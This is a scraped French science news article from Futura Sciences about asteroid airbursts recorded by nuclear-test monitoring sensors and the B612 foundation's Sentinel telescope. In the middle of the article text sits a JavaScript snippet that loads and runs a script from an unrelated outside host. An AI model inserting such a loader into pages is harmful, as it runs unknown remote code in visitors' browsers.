{"title": "Asteroides : 26 Hiroshima ont frappe la Terre depuis 2000", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2014-04-29", "content": "L'asteroide Florence a frole la Terre le premier septembre 2017. Mesurant 4,5 km de diametre, ce geocroiseur est donc potentiellement capable d'entrer en collision avec la Terre et d'atteindre sa surface sans exploser en vol. C'est le moment de se rappeler que la fondation B612 a denombre 26 corps celestes de taille plus petite, et ayant donc explose dans l'atmosphere, qui ont frappe la Terre entre 2000 et 2013, liberant a chaque fois une energie comparable a celle de la bombe d'Hiroshima. Voila de quoi se convaincre de l'urgence de la detection precoce des geocroiseurs. Article publie le 29/04/2014 Les  asteroides  et les  meteorites  sont decidement dans l' air  du temps. Peut-etre parce qu'ils sont un moyen convaincant d'obtenir des credits pour poursuivre l'exploration du  Systeme solaire  et surtout le coloniser. La generation des quadragenaires actuels (qu'ils soient fondateurs de grandes entreprises ou  astronautes ) a grandi avec les romans d' Arthur Clarke  et les series  Star Trek  et  Cosmos 1999 . L' ISS  fait malheureusement pale figure face a la station spatiale en  orbite  autour de la  Terre  de  2001, l'Odyssee de l'espace . Certains ont reagi en fondant  SpaceX  et  Planetary Resources . La conquete des asteroides y est au programme, et la spectaculaire chute de l'un d'entre eux sur Terre dans la region de Tcheliabinsk, dans l'Oural russe, a ete l'occasion de prendre conscience que notre planete n'est pas hors de danger. Elle pourrait subir un jour une nouvelle catastrophe comme celle ayant mis fin au  Cretace .  Dans cette video, 25 explosions liees a l'entree dans l'atmosphere de petits corps celestes entre 2000 et 2013 sont indiquees. L'encadre en haut a gauche montre que ces explosions sont comparables a celle de la bombe d'Hiroshima. Heureusement, ces evenements se sont produits a haute altitude et souvent au-dessus des oceans. Un impact capable de detruire une ville peut arriver en moyenne une fois par siecle environ. (c) GentsideDecouvertes Surfant sur la  vague  causee par cet evenement, la fondation B612 vient de donner un large echo a un recent rapport de l'Organisation du traite d'interdiction complete des essais nucleaires (CTBTO,  Comprehensive Nuclear-Test-Ban Treaty Organization  en anglais). Ce traite n'a pas encore ete ratifie par tous les pays de la planete, mais l'organisation qui travaille dans ce but est active depuis la fin du XX e  siecle. Elle a deja mis en place des moyens pour detecter et localiser des essais nucleaires secrets et normalement interdits dans l' atmosphere  a l'aide de stations equipees de sismographes et de microbarographes. Ceux-ci sont des  capteurs  pouvant detecter des  ondes sonores  de tres basse  frequence  produites par de grandes explosions, volcaniques ou nucleaires, mais aussi par la chute sur Terre d' asteroides  de taille consequente.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  B612, une fondation privee pour se proteger des asteroides geocroiseurs Selon la fondation B612, entre 2000 et 2013, le reseau de microbarographes a detecte 26 explosions causees par des impacts d'asteroides dont la puissance etait comprise entre 1 et 600 kilotonnes de  TNT . Rappelons que la puissance de l'explosion d'Hiroshima a ete evaluee a 15 kilotonnes. Heureusement, comme pour le  meteore  de  Tcheliabinsk  qui a libere une  energie  equivalente a celle d'une explosion de 500 kilotonnes, les petits corps celestes a l'origine de ces evenements n'ont pas atteint la surface de la Terre. Pour donner une idee des degats qu'ils auraient pu causer, on peut comparer la puissance de leurs explosions a celle qui a forme le celebre Meteor Crater en Arizona : de 20 a 40 megatonnes. Dans cette video, l'un des membres fondateurs de la fondation B612, Ed Lu, explique que le petit corps celeste a l'origine de la formation du Meteor Crater aurait facilement detruit le centre d'une ville comme San Francisco. Seul 1 % du ciel ou pourraient se trouver des geocroiseurs capables d'entrer en collision avec la Terre et de detruire une ville serait connu. Le telescope Sentinel permettrait de les reperer longtemps a l'avance. Dans ce cas, une legere modification de la vitesse du geocroiseur, par exemple en utilisant l'attraction gravitationnelle d'un vehicule spatial, suffirait pour eviter un impact avec la Terre. (c) Meteor Crater, YouTube C'est aussi du Meteor Crater que l'astronaute Ed Lu se sert pour faire prendre conscience dans la video ci-dessus de l'importance de la fondation privee qu'il a creee en 2002 avec son collegue Russell Schweickart et un celebre astrophysicien de Princeton,  Piet Hut . Lu a vole deux fois a bord d'une navette spatiale et Schweickart a fait partie des missions  Apollo  9 et  Skylab . Quant a Hut, il s'est fait un nom dans le domaine de l'etude du probleme a N corps en mecanique celeste (par exemple des  etoiles  ou des  galaxies ) a l'aide d' ordinateurs . Les membres de la  fondation B612  (du nom de l'asteroide dont est originaire le Petit Prince d' Antoine de Saint-Exupery ) se proposent de proteger la Terre du danger que font peser sur elle les  geocroiseurs . En juillet 2012, a l'occasion de l'anniversaire de l'impact de la  Toungouska , ils ont annonce le lancement du projet Sentinel. Il s'agit de la construction et du lancement d'un  telescope  spatial capable de detecter dans l' infrarouge  tous les  geocroiseurs  representant une reelle menace pour la planete. Il en resterait des millions a detecter. L'un des partenaires de la fondation B612 est la societe Ball Aerospace, qui a contribue a la mise au point des  telescopes Hubble ,  Spitzer  et Kepler. Mais les membres de la fondation se tournent aussi vers chacun d'entre nous en faisant appel a des dons ou simplement en vendant des t-shirts. ", "theme": "sciences"}